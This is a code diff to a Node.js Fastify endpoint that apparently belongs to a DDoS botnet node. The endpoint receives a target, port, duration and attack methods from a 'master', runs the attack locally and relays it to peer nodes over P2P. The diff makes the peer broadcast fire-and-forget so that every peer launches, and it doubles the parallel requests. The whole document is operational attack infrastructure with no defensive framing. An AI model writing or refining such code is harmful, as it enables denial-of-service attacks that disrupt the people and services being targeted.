@@ -528,7 +528,7 @@ fastify.post('/nz-sec', {
       port: validatedPort
     });
 
-    // 1) Jalankan attack lokal
+    // 1) Execute attack locally
     const localResult = await executor.execute(command, {
       expectedDuration: validatedTime
     });
@@ -539,42 +539,52 @@ fastify.post('/nz-sec', {
       pid: localResult.pid
     });
 
-    // 2) Broadcast ke P2P peers secepat mungkin (jika P2P aktif)
+    // 2) Broadcast to P2P peers IMMEDIATELY (not in background)
     let p2pSummary = null;
 
     if (p2pNode && p2pNode.p2pConfig.enabled && p2pNode.peers.size > 0) {
-      console.log('[SECURE-EXEC] Broadcasting attack to P2P peers...');
+      console.log(`[SECURE-EXEC] Broadcasting attack to ${p2pNode.peers.size} P2P peer(s)...`);
 
-      // Biar respon ke master tetap cepat, kita kasih timeout logika internal
-      const p2pPromise = p2pNode.broadcastAttackRequest({
-        target: validatedTarget,
-        time: validatedTime,
-        port: validatedPort,
-        methods: validatedMethods,
-        // targetPeerIds: [], // bisa diisi kalau mau pilih peer tertentu
-        maxParallel: 5
-      });
+      try {
+        // FIX: Don't use Promise.race - just broadcast and don't wait
+        // This ensures the attack is sent to ALL peers
+        const p2pPromise = p2pNode.broadcastAttackRequest({
+          target: validatedTarget,
+          time: validatedTime,
+          port: validatedPort,
+          methods: validatedMethods,
+          maxParallel: 10 // Increased parallel requests
+        });
 
-      // Tunggu maximal 2 detik untuk dapat ringkasan
-      p2pSummary = await Promise.race([
-        p2pPromise,
-        new Promise((resolve) => setTimeout(() => resolve({
+        // Fire and forget (async execution)
+        p2pPromise.then(result => {
+          console.log('[SECURE-EXEC] P2P broadcast completed:', result.summary);
+        }).catch(error => {
+          console.error('[SECURE-EXEC] P2P broadcast error:', error.message);
+        });
+
+        // Return quick summary
+        p2pSummary = {
+          success: true,
+          summary: {
+            totalTargets: p2pNode.peers.size,
+            initiated: true
+          },
+          async: true
+        };
+
+      } catch (error) {
+        console.error('[SECURE-EXEC] P2P broadcast error:', error.message);
+        p2pSummary = {
           success: false,
-          summary: { totalTargets: p2pNode.peers.size, success: 0, failed: 0 },
-          timeout: true
-        }), 2000))
-      ]);
-
-      if (p2pSummary.timeout) {
-        console.log('[SECURE-EXEC] P2P broadcast still running in background (timeout 2s)');
-      } else {
-        console.log('[SECURE-EXEC] P2P broadcast done:', p2pSummary.summary);
+          error: error.message
+        };
       }
     } else {
       console.log('[SECURE-EXEC] P2P not available or no peers, skip broadcast');
     }
 
-    // 3) Kirim respon ke master termasuk info P2P
+    // 3) Send response to master
     sendEncryptedResponse(reply, {
       status: 'ok',
       target: validatedTarget,
@@ -589,11 +599,6 @@ fastify.post('/nz-sec', {
         enabled: p2pNode.p2pConfig.enabled,
         peers_connected: p2pNode.peers.size,
         broadcast: p2pSummary
-          ? {
-              success: p2pSummary.success,
-              summary: p2pSummary.summary
-            }
-          : null
       } : {
         enabled: false
       }
